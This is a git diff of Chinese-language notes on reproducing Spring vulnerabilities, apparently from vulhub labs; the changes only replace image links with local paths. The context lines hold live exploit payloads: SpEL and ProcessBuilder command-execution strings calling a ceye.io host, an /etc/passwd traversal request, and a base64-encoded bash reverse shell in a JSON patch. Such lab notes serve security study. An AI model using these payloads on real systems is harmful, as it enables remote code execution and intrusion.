@@ -275,13 +275,13 @@ GET /springapp/css/file:/etc/passwd
 
 > http://localhost:8080/oauth/authorize?response_type=token&client_id=acme&redirect_uri=${2334-1}
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1OmibdCZSorwsATCy6aBFicVmMiaYD14GwsibfaAiaiaG8ylsxPBicrPdoyrt58LA/640?wx_fmt=png)
+![](../../.resource/remote/e48dad37757c882b8f26195445792d28a78460bc66862b646ae823dfb20dcda9.png)
 
 执行命令：
 
 > http://207.246.79.196:8080/oauth/authorize?response_type=token&client_id=acme&redirect_uri=${T(java.lang.Runtime).getRuntime().exec(%22ping%20xxx.ceye.io%22)}
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1OmibJfWvtNvzXlAqSnJdlVia5L5Kr0kjjZia6icy7ek7fkU6fP5icufoFlkErA/640?wx_fmt=png)
+![](../../.resource/remote/2053e76f6e384e3171b3289ca30137aa4678e641ad332a2ff1a02cd2db0af10c.png)
 
 但是此命令执行，不会在页面上显示，只会打印出运行的对象。
 
@@ -343,15 +343,15 @@ FBB204A4061FFBD41284A84C258C1BFB 返回结果是 md5(wooyun)
 
 > &_(new+java.lang.ProcessBuilder("ping","xxx.ceye.io")).start()=vulhub
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1OmibTeyd12niavyoHfMtUWL2df5LJ6hroOevshscRrCINeG7zobsjdKgDjw/640?wx_fmt=png)
+![](../../.resource/remote/2d8f7f2836f287eff17f2e0c0e8d9b15558a1642e77e3dd9027c6bfda67612a3.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1Omib0AcaWsd6gySAjuSdZeKOPN4hc1UmUwvibL0AicmvaTDpanyadaWsOdJA/640?wx_fmt=png)
+![](../../.resource/remote/58b63b6084e8fefe9ccac98e55266eccbc4c4de9188c9d000d76061fb98abf3a.png)
 
 无害化 payload 检测，如果 response header 中出现 vulnerable 头，则有漏洞：
 
 > &_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader("vulnerable","True").aaa=n1nty
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1Omibiaxe94iauibjRS8BxAM3rVJwfOibUgkKPGOGNtmdSjbK1TV47bSVy3zseQ/640?wx_fmt=png)
+![](../../.resource/remote/3048db5ca93130dfd55ff83585c26d3c5739139cf3fdec2c5669ab927e447257.png)
 
 ### CVE-2017-8045 Spring Amqp 中的远程代码执行
 
@@ -377,9 +377,9 @@ FBB204A4061FFBD41284A84C258C1BFB 返回结果是 md5(wooyun)
 [{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzg4OTkgMD4mMQ==}|{base64,-d}|{bash,-i}'))/lastname", "value": "vulhub" }]
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1OmibGticE6ClADSy1eN6eKZRnibIrHAksuzBXFHechkbTSv8g5O1ictIlfPVQ/640?wx_fmt=png)
+![](../../.resource/remote/722f9e17abd60c2a179cc6e0ed2ee40e8892b7c759b4a284808313aec46f18e8.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1OmibmNL6r19dbqgXHCjX99txvwf99ib2U1PWKpERHKcx54ggq3JKSx5YyWw/640?wx_fmt=png)
+![](../../.resource/remote/89516042dfefe2efe72c7fe12ea9309fdf452f26fee601f1e7a2b16671442a67.png)
 
 ### CVE-2018-1258 Spring Security 未经授权的访问
 
@@ -407,15 +407,15 @@ FBB204A4061FFBD41284A84C258C1BFB 返回结果是 md5(wooyun)
 ws://x.x.x.x:8080/gs-guide-websocket/845/beqcexeb/websocket
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1Omib0k7FFvwxG2hGzcJAYbrqKswTFpo3UBAUab0hvwhdeVbaFquuoF828Q/640?wx_fmt=png)
+![](../../.resource/remote/1bd1091bab9f9ce5fd65063cb83ab402a6b0b4ecb68b4f928c6ab02c12f870e7.png)
 
 从 bp 中看到来回四个包，其中的内容为如上所示，修改如下请求包
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1OmibQDOmicjsMVWianh5jkGxBZdyfFlNZ9GN6OWYK1Qp2XBfkkMlmZ7PpicbA/640?wx_fmt=png)
+![](../../.resource/remote/0da1bceae8532f3a7ca187ce47842c117fce4826f6a1f8c16d06b33cc1d268fe.png)
 
 在发送任意消息，即可触发
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1OmibOQR2dI30zIczXxbUV6ZPvbQ8FPqQiaicCyenRy6iaibrLUQjBe7cEYcmsA/640?wx_fmt=png)
+![](../../.resource/remote/58db169716b33c73cf8a5df0e1febfe96dff2f7687825680e8bed5e6f91f1fee.png)
 
 或者尝试使用 vulhub 提供的脚本，但是此脚本并不具备通用性，需要修改使用 poc
 
@@ -446,7 +446,7 @@ ws://x.x.x.x:8080/gs-guide-websocket/845/beqcexeb/websocket
 > 
 > https://www.cnblogs.com/hac425/p/9656747.html
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1OmibhBSEEXD0PmedHkLWavLBWZ4T6P9Oy2oVibNXJ8zDzJWKutgNCIFjnpg/640?wx_fmt=png)
+![](../../.resource/remote/a6639a7c073a5d7fbaa622ab9afec992e655e5686e5eb4a89b47375b5d638c7b.png)
 
 POC：
 
@@ -492,7 +492,7 @@ Spring Security OAuth 2.0到2.0.15
 http://localhost:8080/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://127.0.0.1&scope=openid
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1Omibic1L4u5ATDrJOQGElRKr9ibpibUpKOZBHUwGbiaDyeJI8ghlkGo1ib6rtQg/640?wx_fmt=png)
+![](../../.resource/remote/f10935c70125fe352e47a49ffc0e0711762d1108f489da9e38ad708d771ba820.png)
 
 即授权了读取权限的时候，修改为 all 就可以获得全部权限。
 
@@ -512,7 +512,7 @@ cd spring-cloud-config-server                                                   
 
 其中路径代表：`/{name}/{profile}/{label}/`，如下中所显示的 json。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2zTMappEOic20ndILKM1OmibaCickBB0BgnJ0DLOvpu1QqOfibjhJC8jGAibYNKXtIIxa0JjTJNnyiaaBw/640?wx_fmt=png)
+![](../../.resource/remote/8380dae6fbca320b8feb6b7a3d2e484b79349d922c82aea2fd843a4479667976.png)
 
 ### CVE-2019-3778 Spring Security OAuth 开放重定向
 
